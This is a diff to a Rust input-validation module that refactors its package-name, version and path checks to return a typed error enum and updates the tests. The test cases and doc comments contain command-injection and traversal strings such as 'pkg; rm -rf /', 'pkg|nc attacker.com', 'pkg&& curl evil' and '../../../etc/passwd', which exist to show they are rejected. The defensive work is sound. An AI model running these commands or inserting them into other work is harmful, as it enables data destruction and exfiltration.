@@ -2,9 +2,56 @@
 //!
 //! Prevents command injection, path traversal, and other input-based attacks.
 
-use anyhow::{Result, bail};
+use thiserror::Error;
 
+const MAX_PACKAGE_NAME_LENGTH: usize = 255;
+const MAX_VERSION_LENGTH: usize = 128;
 const MAX_RELATIVE_PATH_LENGTH: usize = 4096;
+
+/// Domain failures from package-name, version, and relative-path checks.
+#[derive(Debug, Error, Clone, PartialEq, Eq)]
+pub enum ValidationError {
+    #[error("Package name cannot be empty")]
+    PackageNameEmpty,
+    #[error("Package name too long (max {max} characters)")]
+    PackageNameTooLong { max: usize },
+    #[error("Package name cannot start with '-' (option injection protection)")]
+    PackageNameStartsWithDash,
+    #[error("Package name cannot start with '.' (hidden file protection)")]
+    PackageNameStartsWithDot,
+    #[error(
+        "Invalid character '{character}' in package name. Only alphanumeric, -, _, ., +, @, / allowed"
+    )]
+    PackageNameInvalidChar { character: char },
+    #[error("Package name cannot contain '..' (path traversal protection)")]
+    PackageNamePathTraversal,
+    #[error("Package name cannot start with '/'")]
+    PackageNameAbsolute,
+    #[error("Version cannot be empty")]
+    VersionEmpty,
+    #[error("Version string too long (max {max} characters)")]
+    VersionTooLong { max: usize },
+    #[error("Version cannot be a filesystem path component")]
+    VersionPathComponent,
+    #[error("Invalid character '{character}' in version string")]
+    VersionInvalidChar { character: char },
+    #[error("Runtime version name 'current' is reserved")]
+    RuntimeVersionReserved,
+    #[error("Runtime version contains characters unsafe for filesystem paths")]
+    RuntimeVersionUnsafePath,
+    #[error("Path cannot be empty")]
+    PathEmpty,
+    #[error("Path too long (max {max} bytes)")]
+    PathTooLong { max: usize },
+    #[error("Path contains null byte")]
+    PathNullByte,
+    #[error("Absolute paths not allowed")]
+    PathAbsolute,
+    #[error("Path traversal detected (..)")]
+    PathTraversal,
+    #[error("Suspicious path pattern (//)")]
+    PathDoubleSlash,
+}
 
 /// Validates a package name for security
 ///
@@ -19,45 +66,42 @@ const MAX_RELATIVE_PATH_LENGTH: usize = 4096;
 /// - `pkg; rm -rf /`
 /// - `pkg$(whoami)`
 /// - `pkg|nc attacker.com`
-pub fn validate_package_name(name: &str) -> Result<()> {
+pub fn validate_package_name(name: &str) -> Result<(), ValidationError> {
     if name.is_empty() {
-        bail!("Package name cannot be empty");
+        return Err(ValidationError::PackageNameEmpty);
     }
 
-    if name.len() > 255 {
-        bail!("Package name too long (max 255 characters)");
+    if name.len() > MAX_PACKAGE_NAME_LENGTH {
+        return Err(ValidationError::PackageNameTooLong {
+            max: MAX_PACKAGE_NAME_LENGTH,
+        });
     }
 
     if name.starts_with('-') {
-        bail!("Package name cannot start with '-' (option injection protection)");
+        return Err(ValidationError::PackageNameStartsWithDash);
     }
 
     if name.starts_with('.') {
-        bail!("Package name cannot start with '.' (hidden file protection)");
+        return Err(ValidationError::PackageNameStartsWithDot);
     }
 
-    // Check for dangerous characters using iterator for better performance/readability
-    if let Some(c) = name.chars().find(|&c| !is_safe_package_char(c)) {
-        bail!(
-            "Invalid character '{c}' in package name. Only alphanumeric, -, _, ., +, @, / allowed"
-        );
+    if let Some(character) = name.chars().find(|&c| !is_safe_package_char(c)) {
+        return Err(ValidationError::PackageNameInvalidChar { character });
     }
 
-    // Additional checks for common attack patterns
     if name.contains("..") {
-        bail!("Package name cannot contain '..' (path traversal protection)");
+        return Err(ValidationError::PackageNamePathTraversal);
     }
 
-    // Prevent absolute paths (redundant but safe)
     if name.starts_with('/') {
-        bail!("Package name cannot start with '/'");
+        return Err(ValidationError::PackageNameAbsolute);
     }
 
     Ok(())
 }
 
 /// Validates multiple package names
-pub fn validate_package_names(names: &[String]) -> Result<()> {
+pub fn validate_package_names(names: &[String]) -> Result<(), ValidationError> {
     for name in names {
         validate_package_name(name)?;
     }
@@ -99,7 +143,7 @@ pub fn is_local_package_file(name: &str) -> bool {
 /// Validates a package name or local package file path
 ///
 /// Accepts either a valid package name OR an existing local package file.
-pub fn validate_package_name_or_file(name: &str) -> Result<()> {
+pub fn validate_package_name_or_file(name: &str) -> Result<(), ValidationError> {
     // Allow local package files
     if is_local_package_file(name) {
         return Ok(());
@@ -110,7 +154,7 @@ pub fn validate_package_name_or_file(name: &str) -> Result<()> {
 }
 
 /// Validates multiple package names or local package file paths
-pub fn validate_package_names_or_files(names: &[String]) -> Result<()> {
+pub fn validate_package_names_or_files(names: &[String]) -> Result<(), ValidationError> {
     for name in names {
         validate_package_name_or_file(name)?;
     }
@@ -134,23 +178,25 @@ fn is_safe_package_char(c: char) -> bool {
 ///
 /// Version strings should follow semver or similar format.
 /// This prevents injection via version fields.
-pub fn validate_version(version: &str) -> Result<()> {
+pub fn validate_version(version: &str) -> Result<(), ValidationError> {
     if version.is_empty() {
-        bail!("Version cannot be empty");
+        return Err(ValidationError::VersionEmpty);
     }
 
-    if version.len() > 128 {
-        bail!("Version string too long (max 128 characters)");
+    if version.len() > MAX_VERSION_LENGTH {
+        return Err(ValidationError::VersionTooLong {
+            max: MAX_VERSION_LENGTH,
+        });
     }
 
     if matches!(version, "." | "..") {
-        bail!("Version cannot be a filesystem path component");
+        return Err(ValidationError::VersionPathComponent);
     }
 
     // Allow: digits, dots, hyphens, plus, colons (for epochs), and letters
-    for c in version.chars() {
-        if !c.is_ascii_alphanumeric() && !matches!(c, '.' | '-' | '+' | ':' | '~') {
-            bail!("Invalid character '{c}' in version string");
+    for character in version.chars() {
+        if !character.is_ascii_alphanumeric() && !matches!(character, '.' | '-' | '+' | ':' | '~') {
+            return Err(ValidationError::VersionInvalidChar { character });
         }
     }
 
@@ -162,15 +208,15 @@ pub fn validate_version(version: &str) -> Result<()> {
 /// Runtime versions are stricter than package versions: package-manager epoch
 /// and tilde syntax are not valid runtime directory names, and `current` is
 /// reserved for the active-version symlink.
-pub fn validate_runtime_version(version: &str) -> Result<()> {
+pub fn validate_runtime_version(version: &str) -> Result<(), ValidationError> {
     validate_version(version)?;
 
     if version.eq_ignore_ascii_case("current") {
-        bail!("Runtime version name 'current' is reserved");
+        return Err(ValidationError::RuntimeVersionReserved);
     }
 
     if version.contains(':') || version.contains('~') {
-        bail!("Runtime version contains characters unsafe for filesystem paths");
+        return Err(ValidationError::RuntimeVersionUnsafePath);
     }
 
     Ok(())
@@ -182,30 +228,31 @@ pub fn validate_runtime_version(version: &str) -> Result<()> {
 /// - Don't contain ../ (parent directory)
 /// - Don't start with / (absolute paths)
 /// - Don't contain null bytes
-pub fn validate_relative_path(path: &str) -> Result<()> {
+pub fn validate_relative_path(path: &str) -> Result<(), ValidationError> {
     if path.is_empty() {
-        bail!("Path cannot be empty");
+        return Err(ValidationError::PathEmpty);
     }
 
     if path.len() > MAX_RELATIVE_PATH_LENGTH {
-        bail!("Path too long (max {MAX_RELATIVE_PATH_LENGTH} bytes)");
+        return Err(ValidationError::PathTooLong {
+            max: MAX_RELATIVE_PATH_LENGTH,
+        });
     }
 
     if path.contains('\0') {
-        bail!("Path contains null byte");
+        return Err(ValidationError::PathNullByte);
     }
 
     if path.starts_with('/') {
-        bail!("Absolute paths not allowed");
+        return Err(ValidationError::PathAbsolute);
     }
 
     if path.contains("..") {
-        bail!("Path traversal detected (..)");
+        return Err(ValidationError::PathTraversal);
     }
 
-    // Check for suspicious patterns
     if path.contains("//") {
-        bail!("Suspicious path pattern (//)");
+        return Err(ValidationError::PathDoubleSlash);
     }
 
     Ok(())
@@ -228,31 +275,54 @@ mod tests {
 
     #[test]
     fn test_invalid_package_names() {
-        // Shell injection attempts
-        assert!(validate_package_name("pkg; rm -rf /").is_err());
-        assert!(validate_package_name("pkg$(whoami)").is_err());
+        assert!(matches!(
+            validate_package_name("pkg; rm -rf /"),
+            Err(ValidationError::PackageNameInvalidChar { character: ';' })
+        ));
+        assert!(matches!(
+            validate_package_name("pkg$(whoami)"),
+            Err(ValidationError::PackageNameInvalidChar { character: '$' })
+        ));
         assert!(validate_package_name("pkg`id`").is_err());
         assert!(validate_package_name("pkg|nc evil.com").is_err());
         assert!(validate_package_name("pkg&& curl evil").is_err());
         assert!(validate_package_name("pkg\n/bin/bash").is_err());
 
-        // Path traversal
-        assert!(validate_package_name("../../../etc/passwd").is_err());
-        assert!(validate_package_name("foo/../bar").is_err());
+        assert!(matches!(
+            validate_package_name("../../../etc/passwd"),
+            Err(ValidationError::PackageNameStartsWithDot)
+        ));
+        assert!(matches!(
+            validate_package_name("foo/../bar"),
+            Err(ValidationError::PackageNamePathTraversal)
+        ));
 
-        // Option injection
-        assert!(validate_package_name("-rf").is_err());
+        assert!(matches!(
+            validate_package_name("-rf"),
+            Err(ValidationError::PackageNameStartsWithDash)
+        ));
         assert!(validate_package_name("--force").is_err());
 
-        // Hidden files
-        assert!(validate_package_name(".bashrc").is_err());
+        assert!(matches!(
+            validate_package_name(".bashrc"),
+            Err(ValidationError::PackageNameStartsWithDot)
+        ));
 
-        // Absolute paths
-        assert!(validate_package_name("/etc/passwd").is_err());
+        assert!(matches!(
+            validate_package_name("/etc/passwd"),
+            Err(ValidationError::PackageNameAbsolute)
+        ));
 
-        // Empty/too long
-        assert!(validate_package_name("").is_err());
-        assert!(validate_package_name(&"a".repeat(256)).is_err());
+        assert!(matches!(
+            validate_package_name(""),
+            Err(ValidationError::PackageNameEmpty)
+        ));
+        assert!(matches!(
+            validate_package_name(&"a".repeat(256)),
+            Err(ValidationError::PackageNameTooLong {
+                max: MAX_PACKAGE_NAME_LENGTH
+            })
+        ));
     }
 
     #[test]
@@ -276,12 +346,29 @@ mod tests {
 
     #[test]
     fn test_invalid_versions() {
-        assert!(validate_version("").is_err());
-        assert!(validate_version(&"1".repeat(129)).is_err());
-        assert!(validate_version("1.0; rm -rf /").is_err());
+        assert!(matches!(
+            validate_version(""),
+            Err(ValidationError::VersionEmpty)
+        ));
+        assert!(matches!(
+            validate_version(&"1".repeat(129)),
+            Err(ValidationError::VersionTooLong {
+                max: MAX_VERSION_LENGTH
+            })
+        ));
+        assert!(matches!(
+            validate_version("1.0; rm -rf /"),
+            Err(ValidationError::VersionInvalidChar { character: ';' })
+        ));
         assert!(validate_version("1.0$(whoami)").is_err());
-        assert!(validate_version(".").is_err());
-        assert!(validate_version("..").is_err());
+        assert!(matches!(
+            validate_version("."),
+            Err(ValidationError::VersionPathComponent)
+        ));
+        assert!(matches!(
+            validate_version(".."),
+            Err(ValidationError::VersionPathComponent)
+        ));
     }
 
     #[test]
@@ -290,9 +377,15 @@ mod tests {
             assert!(validate_runtime_version(version).is_ok(), "{version}");
         }
 
-        for version in [
-            ".", "..", "current", "CURRENT", "1:2.0", "1.0~rc1", "../1.0",
-        ] {
+        assert!(matches!(
+            validate_runtime_version("current"),
+            Err(ValidationError::RuntimeVersionReserved)
+        ));
+        assert!(matches!(
+            validate_runtime_version("1:2.0"),
+            Err(ValidationError::RuntimeVersionUnsafePath)
+        ));
+        for version in [".", "..", "CURRENT", "1.0~rc1", "../1.0"] {
             assert!(validate_runtime_version(version).is_err(), "{version}");
         }
     }
@@ -305,12 +398,30 @@ mod tests {
 
     #[test]
     fn test_invalid_relative_paths() {
-        assert!(validate_relative_path("").is_err());
-        assert!(validate_relative_path("/etc/passwd").is_err());
-        assert!(validate_relative_path("../../../etc/passwd").is_err());
-        assert!(validate_relative_path("foo/../bar").is_err());
-        assert!(validate_relative_path("foo//bar").is_err());
-        assert!(validate_relative_path("foo\0bar").is_err());
+        assert!(matches!(
+            validate_relative_path(""),
+            Err(ValidationError::PathEmpty)
+        ));
+        assert!(matches!(
+            validate_relative_path("/etc/passwd"),
+            Err(ValidationError::PathAbsolute)
+        ));
+        assert!(matches!(
+            validate_relative_path("../../../etc/passwd"),
+            Err(ValidationError::PathTraversal)
+        ));
+        assert!(matches!(
+            validate_relative_path("foo/../bar"),
+            Err(ValidationError::PathTraversal)
+        ));
+        assert!(matches!(
+            validate_relative_path("foo//bar"),
+            Err(ValidationError::PathDoubleSlash)
+        ));
+        assert!(matches!(
+            validate_relative_path("foo\0bar"),
+            Err(ValidationError::PathNullByte)
+        ));
     }
 
     #[test]
@@ -321,7 +432,15 @@ mod tests {
         let too_long_ascii = "a".repeat(MAX_RELATIVE_PATH_LENGTH + 1);
         let error = validate_relative_path(&too_long_ascii)
             .expect_err("path above the byte limit must be rejected");
-        assert!(error.to_string().contains("Path too long"));
+        assert!(
+            matches!(
+                error,
+                ValidationError::PathTooLong {
+                    max: MAX_RELATIVE_PATH_LENGTH
+                }
+            ),
+            "got: {error}"
+        );
 
         let max_multibyte = "é".repeat(MAX_RELATIVE_PATH_LENGTH / "é".len());
         assert_eq!(max_multibyte.len(), MAX_RELATIVE_PATH_LENGTH);
